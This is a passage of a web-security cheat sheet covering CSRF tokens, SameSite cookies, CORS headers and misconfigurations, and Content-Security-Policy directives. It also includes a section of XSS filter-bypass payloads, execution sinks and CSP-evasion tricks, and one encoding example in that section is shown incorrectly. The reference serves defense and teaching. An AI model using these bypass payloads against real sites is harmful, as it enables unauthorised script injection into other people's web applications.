│ │   ┌─────┐   │ │   ┌─────┐   │ │   ┌─────┐   │ │ ┌─────┐ │ │
│ │   │CSRF │   │ │   │CSRF │   │ │   │CSRF │   │ │ │CSRF │ │ │
│ │   └─────┘   │ │   └─────┘   │ │   └─────┘   │ │ └─────┘ │ │
│ └─────────────┘ └─────────────┘ └─────────────┘ └─────────┘ │
└─────────────────────────────────────────────────────────────┘
```




## 📃 CSRF Defense Cheat Sheet (2025 Edition)

### 🔐 Common CSRF Defenses

#### 1. CSRF Tokens

* Use **cryptographically secure random values**
* Must be **tied to the authenticated session**
* Best practice: **double-submit cookie** pattern with `SameSite` attribute
* Should not be guessable, predictable, or reused
* Implement with **per-form or per-request token freshness**
* Example (with JavaScript fetch):

```javascript
fetch('/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCSRFTokenFromCookie(),
    'Content-Type': 'application/json'
  },
  credentials: 'include',
  body: JSON.stringify({ amount: 100 })
})
```

---

#### 2. HTTP Headers

| Header    | Purpose                             |
| --------- | ----------------------------------- |
| `Origin`  | Indicates the origin of the request |
| `Referer` | Shows full URL path of the page     |

* Validate both `Origin` and `Referer` headers on **state-changing requests**
* Reject requests with missing, empty, or cross-origin headers
* Consider `strict-origin-when-cross-origin` referrer policy for granularity

---

#### 3. SameSite Cookie Attribute

| Mode     | Behavior                                                          |
| -------- | ----------------------------------------------------------------- |
| `None`   | Cookies sent on all requests (requires `Secure` flag)             |
| `Lax`    | Sent on top-level GET navigations, **default** in modern browsers |
| `Strict` | Only sent in same-site requests, **most secure**                  |

```http
Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict
```

---

## 🌐 Cross-Origin Resource Sharing (CORS)

### 🔹 Important CORS Headers

| Header                             | Description                                                    |
| ---------------------------------- | -------------------------------------------------------------- |
| `Access-Control-Allow-Origin`      | Specifies allowed origin(s)                                    |
| `Access-Control-Allow-Methods`     | Specifies allowed HTTP methods (e.g. `POST, PUT`)              |
| `Access-Control-Allow-Headers`     | Specifies allowed headers (e.g. `Authorization, X-CSRF-Token`) |
| `Access-Control-Allow-Credentials` | Allows credentials (cookies, headers) in requests              |
| `Access-Control-Expose-Headers`    | Indicates which headers are visible to the browser             |
| `Access-Control-Max-Age`           | Defines how long preflight responses can be cached             |

### 🤔 Simple vs Preflighted Requests

**Simple requests**:

* `GET`, `HEAD`, `POST` with **no custom headers**
* `Content-Type` must be: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

**Preflighted requests**:

* All other requests
* Browser sends an `OPTIONS` request **before the actual request**
* Server must handle and allow based on origin/method/headers

---

### ❌ Common CORS Misconfigurations

* `Access-Control-Allow-Origin: *` with `Allow-Credentials: true`
* Reflecting arbitrary `Origin` headers (e.g., `echo back Origin`)
* Including `null` as a trusted origin (e.g., via file:// schemes)
* Omitting preflight handling or headers in `OPTIONS` responses

Example of an **insecure misconfig**:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

---

## 🔒 Content-Security Policy (CSP)

### 🔹 Core CSP Directives

| Directive                   | Use Case                                               |
| --------------------------- | ------------------------------------------------------ |
| `default-src`               | Fallback for all resource types not explicitly defined |
| `script-src`                | Controls JS sources                                    |
| `style-src`                 | Controls CSS sources                                   |
| `img-src`                   | Controls image sources                                 |
| `connect-src`               | Defines origins for XMLHttpRequest / fetch             |
| `frame-ancestors`           | Prevents Clickjacking (like `X-Frame-Options`)         |
| `form-action`               | Limits where forms can be submitted                    |
| `base-uri`                  | Restricts the base tag to avoid path manipulation      |
| `upgrade-insecure-requests` | Forces HTTPS for all resource fetches                  |

### Example CSP Header

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

---

## 🛡️ XSS Filter Bypass Techniques (Advanced Reference)

### 🔹 Encodings and Payload Variants

| Technique    | Example                                            |
| ------------ | -------------------------------------------------- |
| Unicode      | `alert(1)`                                         |
| Octal        | `\141\154\145\162\164\50\61\51`                    |
| Hex          | `\x61\x6c\x65\x72\x74\x28\x31\x29`                 |
| Base64       | `atob("YWxlcnQoMSk=")`                             |
| fromCharCode | `String.fromCharCode(97,108,101,114,116,40,49,41)` |
| No-Space     | `<svg/onload=alert(1)>`                            |
| URI Decoding | `decodeURI(/alert("xss")/.source)`                 |

### 🔹 Dangerous Execution Sinks

* `eval()`
* `setTimeout()` / `setInterval()` with string args
* `Function("code")()`
* `new Function("code")`
* `[].constructor.constructor("alert(1)")()`

### 🔹 Bypass Patterns

```html
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
<svg/onload=alert(1)>
<script src="data:text/javascript,alert(1)"></script>
```

### 🔹 CSP-Aware Bypasses

* Exploit `script-src-elem` vs `script-src`
* Use allowed inline event handlers if `'unsafe-inline'` is present
* Abuse open redirect + data URLs if `connect-src` allows `data:`

---

Continue using this reference alongside a hardened CSP, secure session cookies (`SameSite=Strict; Secure; HttpOnly`), and token-based anti-CSRF mechanisms (double-submit pattern or server-bound tokens).

For advanced defense-in-depth, combine:

* CSP (restricts resource loading)
* Origin/Referer validation
* SameSite cookies
* Per-request CSRF tokens
* JWT audience + CSRF token coupling

---

## 📑 Additional Resources

* [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
* [Mozilla CORS Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
* [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
* [PortSwigger XSS Bypass List](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [WebAppSec SameSite Cookies](https://web.dev/samesite-cookies-explained/)
* [CSRF Prevention in SPAs](https://github.com/spotify/backstage/issues/3660#issuecomment-726127604)
* 
